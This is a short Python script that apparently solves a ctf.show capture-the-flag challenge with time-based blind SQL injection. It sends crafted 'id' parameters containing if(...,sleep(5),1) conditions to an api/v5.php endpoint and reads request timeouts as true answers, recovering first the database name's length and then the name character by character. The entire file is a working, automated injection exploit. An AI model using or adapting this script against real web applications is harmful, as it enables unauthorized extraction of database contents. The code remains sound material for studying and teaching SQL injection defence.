import requests
import time

url = "http://5df87368-28a5-4866-8ae0-401ba89ca640.challenge.ctf.show/api/v5.php"


def timeout(url):
    try:
        res = requests.get(url, timeout=3)
    except Exception as e:
        return "timeout"

    return res.text


def getDbNameLen(url):
    dbNameLen = -1
    for i in range(1, 10):
        time.sleep(0.1)
        payload = "?id=2'+and+if (length(database())=" + str(i) + ",sleep(5),1) --+"
        # ?id=2' + and + if(length(database())=i,sleep(5),1) --+
        fullUrl = url + payload
        print(fullUrl)
        if "timeout" in timeout(fullUrl):
            dbNameLen = i
            break

    return dbNameLen


dbNameLen = getDbNameLen(url)


def getDbName(url, dbNameLen):
    dbName = ""
    for i in range(1, dbNameLen + 1):
        for j in range(1, 128):
            payload = "?id=2'+and+if(ascii(substr(database()," + str(i) + ",1))=" + str(j) + ",sleep(5),1) --+"
            # "?id=1'+and+ascii(substr(database()," + str(i) + ",1))=" + str(j) + "--+"
            fullUrl = url + payload
            # print( fullUrl)
            if "timeout" in timeout(fullUrl):
                dbName = dbName + chr(j)
                print("[+] The dbName is", dbName)
                break
    return dbName


if dbNameLen != -1:

    dbName = getDbName(url, dbNameLen)
    print("---------------------------------------\n[+] The dbName is    ", dbName)
    print("[+] The length of dbName is ", dbNameLen)
    print("Have been complete!\n")
else:
    print("I don't find the result!\n")
    print("Have been complete!\n")
